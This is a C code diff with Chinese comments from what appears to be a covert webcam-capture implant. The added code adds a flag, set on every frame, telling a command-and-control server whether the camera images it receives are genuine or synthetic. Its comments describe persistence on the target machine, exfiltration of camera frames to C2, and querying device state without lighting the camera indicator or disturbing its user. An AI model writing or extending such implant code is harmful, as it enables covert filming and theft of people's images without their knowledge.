@@ -141,6 +141,32 @@ typedef struct {
     const char  *name;
     int          last_err;
 
+    /* 当前采集源降级态（cam_degrade_t）。由驻留自检 cd_report_degrade
+     * 写入，cd_pack 读取后落到 exfil 记录的 EXF_FLAG_SRC_SYNTH 位上。
+     *
+     * 为什么必须经 C2 送出去，而不是只打 journal：
+     *   journal 在目标机上，运维读不到。C2 侧看到的只有加密信元流，
+     *   没有这个位就无从判断收到的是真人画面还是合成帧。
+     *
+     * im —— 采集源指针。cd_pack 每帧打包时经 implant_degrade() **实时**
+     * 查询降级态，落到 EXF_FLAG_SRC_SYNTH 位上随帧送达 C2。
+     *
+     * 为什么必须实时查询，而不是缓存"自检时读到的值"：
+     *   曾有一版把降级态缓存在本结构的 src_degrade 字段里，由驻留自检
+     *   回调 cd_report_degrade 写入。而该回调只在 ensure_persist 为真时
+     *   才注册（见下方 implant_set_audit 的包裹条件）——于是关掉驻留、
+     *   或非 root 驻留不可用时，回调永不触发，缓存停留在初值 0，每一帧
+     *   都标成"设备源"。
+     *   实测：v4l2 后端在无采集设备的机器上跑，接收侧解出 flags=0x03，
+     *   SRC_SYNTH 未置位；而单元测试依旧全绿，因为它手工构造 flags，
+     *   根本不经过 cam_daemon。
+     *   "画面是不是真的"是产品语义，不该挂在驻留这个可选功能上。
+     *
+     * 实时查询的代价可忽略：implant_degrade() 只读最近一次 open 写入的
+     * 字段，不重新打开设备，因此既不点亮指示灯、也不与占用者争流——
+     * 这与 implant_probe_degrade()（会真的 open 一次）是两回事。 */
+    const implant_t *im;
+
     /* tcp:// 重连所需。仅当 spec 是 tcp:// 时填充。
      *
      * 为何必须进程内重连：
@@ -366,6 +392,18 @@ static int cd_pack(const uint8_t *in, size_t in_len,
     r.width   = w;
     r.height  = h;
     r.flags   = EXF_FLAG_KEYFRAME | EXF_FLAG_LAST;
+
+    /* 降级态随帧送出去，且必须是**打包这一刻**的实时值。
+     * 见 exfil.h 中 EXF_FLAG_SRC_SYNTH 的说明：这是 C2 侧唯一能判定
+     * "这批画面是不是真人"的字段。
+     *
+     * 置位条件取 d != 0：1 = 无设备、2 = 设备被占用，两者产出的都不是
+     * 设备画面，对 C2 侧的处置决策等价（都不可信）。负值表示探测本身
+     * 失败（im 或 im->src 未就绪），同样不可信，一并置位——宁可让 C2
+     * 人工复核，也不可把无法确认的画面标成"设备源"去误导它。 */
+    int d = s->im ? implant_degrade(s->im) : -1;
+    if (d != 0) r.flags |= EXF_FLAG_SRC_SYNTH;
+
     r.payload = in;
     r.plen    = in_len;
     if (s->name) snprintf(r.name, sizeof r.name, "%s", s->name);
@@ -793,6 +831,14 @@ static void cd_report_degrade(cd_audit_ctx_t *c)
     if (!c || !c->im) return;
     int d = implant_degrade(c->im);
     if (d < 0) return;
+
+    /* journal 去重：只在降级态变化时打印，避免常驻进程每批刷一行。
+     *
+     * 去重只作用于打印，绝不作用于线上帧。线上的 SRC_SYNTH 位不经过
+     * 这里——它由 cd_pack 每帧实时查询 implant_degrade() 得到，因此既
+     * 不会随去重被跳过，也不会停留在"首次自检时的值"。若两者共用一份
+     * 缓存，就会出现"设备已恢复可用、后续帧却仍带 SRC_SYNTH"的错——
+     * 那比不打日志更糟：日志只是没记录，这个位是直接在骗 C2。 */
     if (d == c->last_degrade) return;
 
     c->last_degrade = d;
@@ -1050,6 +1096,11 @@ int cam_daemon_run(const cam_daemon_cfg_t *cfg, cam_daemon_stats_t *out_stats)
 
     implant_set_now(im, cd_now_us, NULL);
     implant_set_sleep(im, cd_sleep_us, NULL);
+    /* cd_pack 每帧经 implant_degrade() 实时查降级态（见 cd_sink_t.im 的
+     * 说明），必须在注册 pack 回调**之前**就位：注册后 implant 随时可能
+     * 产出第一帧，晚一步就会出现"首帧的 SRC_SYNTH 位取自未初始化的
+     * 指针"。放在这里而不是 sink 初始化处，是因为 im 到此刻才存在。 */
+    sink.im = im;
     implant_set_pack(im, cd_pack, &sink);
     implant_set_exfil(im, cd_exfil, &sink);
 
@@ -1066,9 +1117,13 @@ int cam_daemon_run(const cam_daemon_cfg_t *cfg, cam_daemon_stats_t *out_stats)
      *
      * 两者是独立关注点：persist_recheck_batches=0 表示"不做驻留周期性补装"，
      * 不代表"不在乎画面是不是真的"。若把它一并作为安装条件，用户一旦关掉
-     * 驻留自检，采集降级态就再也不会上报——而那恰恰是常驻进程唯一会说出
-     * "当前是假画面"的地方。cd_persist_audit 内部会在 n==0 时跳过驻留部分，
-     * 只做降级上报。 */
+     * 驻留自检，降级态就再也不会打进 journal。cd_persist_audit 内部会在
+     * n==0 时跳过驻留部分，只做降级上报。
+     *
+     * 注意这个回调现已**只负责 journal**（运维在目标机上看），不再负责线上
+     * 帧的 SRC_SYNTH 位——后者由 cd_pack 每帧实时查询 implant_degrade()，
+     * 与 ensure_persist 是否开启无关。两者分离之前，关掉驻留会让每一帧都
+     * 标成"设备源"，即 C2 收到合成画面却被告知是真人画面。 */
     if (cfg->ensure_persist) {
         actx.cfg = cfg;
         actx.st  = &st;
